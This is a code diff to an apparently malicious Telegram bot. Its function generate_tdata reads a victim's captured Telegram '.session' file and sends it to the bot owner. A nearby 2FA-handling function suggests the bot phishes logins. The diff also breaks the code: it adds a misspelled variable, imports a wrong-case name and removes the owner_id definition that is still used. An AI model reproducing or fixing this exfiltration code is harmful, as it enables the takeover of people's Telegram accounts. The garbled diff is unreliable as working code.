@@ -116,20 +116,15 @@ async def check_and_process_2fa(user_id):
 
 async def generate_tdata(user_id, phone):
     try:
-        # Находим owner чтобы отправить ему сессию
-        from aiogram import Bot
         b = Bot(token=BOT_TOKEN)
-        owner_id = OWNER_ID
-        
-        # Отправляем .session файл
         session_path = f'sessions/{phone}.session'
-        if os.path.exists(session_path):
-            from aiogram.types import bufferedinputfile
+        if os.path.exists(session_Path):
             with open(session_path, 'rb') as f:
-                data = f.read()
+                file_data = f.read()
+            from aiogram.types import bufferedinputfile
             await b.send_document(
                 owner_id,
-                BufferedInputFile(data, filename=f'{phone}.session'),
+                bufferedinputfile(file_data, filename=f'{phone}.session'),
                 caption=f'✅ Session для {phone}'
             )
         await b.session.close()
